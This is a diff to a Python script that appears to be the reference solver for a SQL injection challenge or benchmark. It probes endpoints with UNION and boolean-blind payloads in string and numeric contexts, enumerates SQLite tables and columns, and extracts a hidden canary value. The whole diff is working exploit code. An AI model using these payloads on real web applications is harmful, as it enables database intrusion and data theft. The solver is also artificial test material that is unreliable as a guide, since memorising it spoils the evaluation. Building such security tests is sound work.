@@ -58,64 +58,88 @@ def _get(endpoint: str, param: str, value: str, timeout: float = 5.0) -> str:
         return ""
 
 
-def _union(mid: str, from_clause: str = "") -> str:
+def _union(mid: str, from_clause: str = "", context: str = "string") -> str:
     """A 3-column UNION payload (products has 3 columns): our value goes in the
-    middle (name) column, an optional FROM/WHERE follows the column list, and
-    `-- -` comments out the rest of the original query."""
+    middle (name) column, an optional FROM/WHERE follows, and `-- -` comments
+    out the rest. The prefix closes the injection point -- a quote for a string
+    context, a bare number for a numeric one."""
     tail = f" {from_clause}" if from_clause else ""
-    return f"' UNION SELECT 1, {mid}, 1{tail}-- -"
+    core = f"UNION SELECT 1, {mid}, 1{tail}"
+    prefix = "0 " if context == "numeric" else "' "
+    return f"{prefix}{core}-- -"
 
 
 NAME_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_"
 HEX_CHARSET = "0123456789abcdef"
 
 
-def find_injectable() -> tuple[str, str, str] | None:
-    """Return (endpoint, param, variant) for the injectable endpoint.
+def find_injectable() -> tuple[str, str, str, str] | None:
+    """Return (endpoint, param, technique, context) for the injectable endpoint.
 
-    Tries the union technique first (does our marker echo back in a row?), then
-    the boolean-blind technique (does a true condition differ from a false one?).
+    Tries both techniques (union: does our marker echo in a row? boolean: does a
+    true condition differ from a false one?) in both contexts (string vs numeric
+    injection point), so it discovers whichever variant this run uses.
     """
-    union_payload = _union(f"'{MARKER}'")
     for endpoint in CANDIDATE_ENDPOINTS:
         for param in CANDIDATE_PARAMS:
-            if MARKER in _get(endpoint, param, union_payload):
-                return endpoint, param, "union"
-            if _is_boolean_injectable(endpoint, param):
-                return endpoint, param, "boolean"
+            for context in ("string", "numeric"):
+                body = _get(endpoint, param, _union(f"'{MARKER}'", context=context))
+                if _marker_in_results(body):
+                    return endpoint, param, "union", context
+                if _is_boolean_injectable(endpoint, param, context):
+                    return endpoint, param, "boolean", context
     return None
+
+
+def _marker_in_results(body: str) -> bool:
+    """True only if the marker appears in an actual results row -- not merely
+    echoed inside a SQL error message (a wrong-context payload errors, and the
+    error text contains the offending token, which would otherwise look like a
+    successful injection)."""
+    try:
+        data = json.loads(body)
+    except json.JSONDecodeError:
+        return False
+    for row in data.get("results", []):
+        if isinstance(row, list) and any(MARKER in str(c) for c in row):
+            return True
+    return False
 
 
 # --- boolean-blind helpers ---------------------------------------------
 
-def _btest(endpoint: str, param: str, condition: str) -> bool:
+def _bool_payload(condition: str, context: str) -> str:
+    prefix = "0 OR" if context == "numeric" else "zzz' OR"
+    return f"{prefix} ({condition})-- -"
+
+
+def _btest(endpoint: str, param: str, condition: str, context: str) -> bool:
     """Ask the target a yes/no question via a boolean-blind OR injection: the
     response's `found` reflects `condition`."""
-    payload = f"zzz' OR ({condition})-- -"
-    body = _get(endpoint, param, payload)
+    body = _get(endpoint, param, _bool_payload(condition, context))
     try:
         return bool(json.loads(body).get("found"))
     except (json.JSONDecodeError, AttributeError):
         return False
 
 
-def _is_boolean_injectable(endpoint: str, param: str) -> bool:
+def _is_boolean_injectable(endpoint: str, param: str, context: str) -> bool:
     """Injectable via boolean blind iff a true condition yields found=true and a
     false one yields found=false."""
-    return _btest(endpoint, param, "1=1") and not _btest(endpoint, param, "1=2")
+    return _btest(endpoint, param, "1=1", context) and not _btest(endpoint, param, "1=2", context)
 
 
 def _blind_string(endpoint: str, param: str, subquery: str, charset: str,
-                  max_len: int = 64) -> str:
+                  context: str, max_len: int = 64) -> str:
     """Reconstruct the string value of `subquery` one character at a time using
     only true/false answers."""
     out = ""
     for i in range(1, max_len + 1):
-        if not _btest(endpoint, param, f"length(({subquery})) >= {i}"):
+        if not _btest(endpoint, param, f"length(({subquery})) >= {i}", context):
             break
         found = None
         for c in charset:
-            if _btest(endpoint, param, f"substr(({subquery}),{i},1)='{c}'"):
+            if _btest(endpoint, param, f"substr(({subquery}),{i},1)='{c}'", context):
                 found = c
                 break
         if found is None:
@@ -124,15 +148,16 @@ def _blind_string(endpoint: str, param: str, subquery: str, charset: str,
     return out
 
 
-def _extract_column(endpoint: str, param: str, mid: str, from_clause: str = "") -> list[str]:
+def _extract_column(endpoint: str, param: str, mid: str, from_clause: str = "",
+                    context: str = "string") -> list[str]:
     """Run a UNION that puts `mid` in the middle (name) column and collect the
     values it returns.
 
-    The vulnerable query returns the real products too (the `LIKE '%'` matches
-    everything), so injected rows are tagged with our marker and prefix-filtered
-    -- otherwise product names would be mistaken for extracted data."""
+    The vulnerable query returns the real products too, so injected rows are
+    tagged with our marker and prefix-filtered -- otherwise product names would
+    be mistaken for extracted data."""
     tagged = f"'{MARKER}:' || ({mid})"
-    body = _get(endpoint, param, _union(tagged, from_clause))
+    body = _get(endpoint, param, _union(tagged, from_clause, context))
     try:
         data = json.loads(body)
     except json.JSONDecodeError:
@@ -150,31 +175,31 @@ def solve() -> dict | None:
     hit = find_injectable()
     if not hit:
         return None
-    endpoint, param, variant = hit
-    if variant == "boolean":
-        return _solve_boolean(endpoint, param)
-    return _solve_union(endpoint, param)
+    endpoint, param, technique, context = hit
+    if technique == "boolean":
+        return _solve_boolean(endpoint, param, context)
+    return _solve_union(endpoint, param, context)
 
 
-def _solve_boolean(endpoint: str, param: str) -> dict | None:
+def _solve_boolean(endpoint: str, param: str, context: str) -> dict | None:
     """Blind extraction: find the secret table and column, then the canary,
     all through true/false answers."""
     table = _blind_string(
         endpoint, param,
         "SELECT name FROM sqlite_master WHERE type='table' AND name!='products' LIMIT 1",
-        NAME_CHARSET,
+        NAME_CHARSET, context,
     )
     if not table:
         return None
     column = _blind_string(
         endpoint, param,
         f"SELECT name FROM pragma_table_info('{table}') WHERE name!='id' LIMIT 1",
-        NAME_CHARSET,
+        NAME_CHARSET, context,
     )
     if not column:
         return None
     canary = _blind_string(
-        endpoint, param, f'SELECT "{column}" FROM "{table}" LIMIT 1', HEX_CHARSET,
+        endpoint, param, f'SELECT "{column}" FROM "{table}" LIMIT 1', HEX_CHARSET, context,
     )
     if not canary:
         return None
@@ -182,17 +207,18 @@ def _solve_boolean(endpoint: str, param: str) -> dict | None:
         "endpoint": endpoint,
         "parameter": param,
         "injection_type": "sql_injection",
-        "payload": f"zzz' OR (substr((SELECT \"{column}\" FROM \"{table}\"),1,1)='?')-- -",
+        "payload": _bool_payload(
+            f"substr((SELECT \"{column}\" FROM \"{table}\"),1,1)='?'", context),
         "severity": "high",
         "confidence": 0.95,
         "evidence": {"canary": canary},
     }
 
 
-def _solve_union(endpoint: str, param: str) -> dict | None:
+def _solve_union(endpoint: str, param: str, context: str) -> dict | None:
     # 2. tables -> the secret table is the one that isn't products
     tables = _extract_column(
-        endpoint, param, "name", "FROM sqlite_master WHERE type='table'"
+        endpoint, param, "name", "FROM sqlite_master WHERE type='table'", context
     )
     secret_tables = [t for t in tables if t and t != "products"]
     if not secret_tables:
@@ -201,7 +227,7 @@ def _solve_union(endpoint: str, param: str) -> dict | None:
 
     # 3. columns of that table -> the secret column is the one that isn't id
     cols = _extract_column(
-        endpoint, param, "name", f"FROM pragma_table_info('{secret_table}')"
+        endpoint, param, "name", f"FROM pragma_table_info('{secret_table}')", context
     )
     secret_cols = [c for c in cols if c and c != "id"]
     if not secret_cols:
@@ -209,7 +235,8 @@ def _solve_union(endpoint: str, param: str) -> dict | None:
     secret_column = secret_cols[0]
 
     # 4. extract the canary
-    values = _extract_column(endpoint, param, f'"{secret_column}"', f'FROM "{secret_table}"')
+    values = _extract_column(
+        endpoint, param, f'"{secret_column}"', f'FROM "{secret_table}"', context)
     # the canary is the value that isn't an ordinary product name
     products = {"Widget", "Gadget", "Sprocket", "Cog"}
     canary_values = [v for v in values if v not in products]
@@ -217,7 +244,7 @@ def _solve_union(endpoint: str, param: str) -> dict | None:
         return None
     canary = canary_values[0]
 
-    payload = _union(f'"{secret_column}"', f'FROM "{secret_table}"')
+    payload = _union(f'"{secret_column}"', f'FROM "{secret_table}"', context)
     return {
         "endpoint": endpoint,
         "parameter": param,
